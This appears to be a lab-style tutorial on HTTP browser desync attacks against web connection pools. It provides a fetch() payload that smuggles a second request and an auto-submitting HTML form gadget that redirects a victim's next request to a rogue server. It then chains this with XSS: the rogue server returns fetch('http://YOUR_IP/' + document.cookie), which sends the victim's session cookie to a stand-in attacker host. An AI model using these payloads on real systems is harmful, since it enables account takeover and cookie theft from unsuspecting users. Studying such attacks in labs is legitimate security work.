# HTTP Browser Desync Attack

### In a Browser Desync attack, the attacker aims to take control of a victim's account by exploiting vulnerabilities in a web application's user connection system.

### This attack occurs in two steps:

#### 1) The initial request, appearing legitimate, is intended to disrupt the user request queue by introducing an arbitrary request. 

#### 2) Once the connection pool is compromised, the very next valid request will be replaced by the arbitrary request initiated in the previous step.

### Straightforward payload example:

fetch('http://MACHINE_IP:5000/', {    method: 'POST',    body: 'GET /redirect HTTP/1.1\r\nFoo: x',    mode: 'cors',})

### Write this JavaScript Payload in your browser command line that you can write JS

### Command breakdown:

#### 1) http://MACHINE_IP = This is the URL to which the HTTP request is made for the vulnerable server. In this case, it's the registration endpoint on the local server.

#### 2) { method: 'POST' } = The method parameter specifies the HTTP method for the request. Here, it's set to 'POST'.

#### 3) { body: 'GET /redirect HTTP/1.1\r\nFoo: x' } = In the body, there is the second request that is going to be injected into the queue.

#### 4) { mode: 'cors' } = This flag triggers an error when visiting the 404 web page and avoids following the redirect.

# Browser Desync exploit chaining XSS

### One potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.

### Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim. 

### We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:

<form id="btn" action="http://MACHINE_NAME.COM/"
    method="POST"
    enctype="text/plain">
<textarea name="GET http://YOUR_IP HTTP/1.1
AAA: A">placeholder1</textarea>
<button type="submit">placeholder2</button>
</form>
<script> btn.submit() </script>

### We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don't want to encode the second malicious request.

### Furthermore, the textarea's name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.

### To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim's session.

### To do so, we can set up a rogue server by serving a route with a malicious payload like fetch('http://YOUR_IP/' + document.cookie);
